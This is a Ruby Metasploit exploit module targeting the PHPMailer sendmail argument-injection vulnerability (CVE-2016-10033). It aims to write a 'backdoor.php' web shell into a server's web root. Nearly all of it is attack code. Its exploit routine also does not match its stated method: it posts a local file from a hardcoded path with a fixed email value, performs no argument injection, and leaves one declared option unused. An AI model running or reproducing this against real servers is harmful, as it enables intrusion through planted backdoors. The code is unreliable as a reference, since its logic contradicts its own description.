##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ManualRanking

  include Msf::Exploit::FileDropper
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'PHPMailer Sendmail Argument Injection',
      'Description'    => %q{
        PHPMailer versions up to and including 5.2.19 are affected by a
        vulnerability which can be leveraged by an attacker to write a file with
        partially controlled contents to an arbitrary location through injection
        of arguments that are passed to the sendmail binary. This module
        writes a payload to the web root of the webserver before then executing
        it with an HTTP request. The user running PHPMailer must have write
        access to the specified WEB_ROOT directory and successful exploitation
        can take a few minutes.
      },
      'Author'         => [
        'Dawid Golunski',   # vulnerability discovery and original PoC
        'Spencer McIntyre'  # metasploit module
      ],
      'License'        => MSF_LICENSE,
      'References'     => [
        ['CVE', '2016-10033'],
        ['CVE', '2016-10045'],
        ['EDB', '40968'],
        ['EDB', '40969'],
        ['URL', 'https://github.com/opsxcq/exploit-CVE-2016-10033'],
        ['URL', 'https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html']
      ],
      'DisclosureDate' => '2016-12-26',
      'Platform'       => 'php',
      'Arch'           => ARCH_PHP,
      'Payload'        => {'DisableNops' => true},
      'Targets'        => [
        ['PHPMailer <5.2.18', {}],
        ['PHPMailer 5.2.18 - 5.2.19', {}]
      ],
      'DefaultTarget'  => 0,
      'Notes'          =>
        {
          'Stability'   => [ CRASH_SAFE, ],
          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS, ],
          'Reliability' => [ REPEATABLE_SESSION, ],
        },
    ))

    register_options(
      [
        OptString.new('LOCAL_FILE_PATH',  [true, 'Path of the file to upload', '/home/moses']),
        OptString.new('REMOTE_BACKDOOR_NAME',  [true, 'Path of the file to upload', 'b.php']),
        OptString.new('WEB_ROOT',   [true, 'Path to the web root', '/var/www/html'])
      ])

  end

  def exploit
    require 'net/http'
    payload_file_name = "backdoor.php"
    payload_file_path = "#{datastore['WEB_ROOT']}/#{payload_file_name}"

    local_file_name = datastore['LOCAL_FILE_PATH']
    file = File.open(local_file_name)
    data = file.read

    print_status("Writing the backdoor to #{payload_file_path}")
    host = URI("http://#{datastore['RHOSTS']}:#{datastore['RPORT']}/")
    print_status("remote host is  #{host}")
    response = Net::HTTP.post_form(host,  { "name" => payload_file_name, "email" => "Token@8010280", "message" => data})
    register_files_for_cleanup(payload_file_path)
  end
end
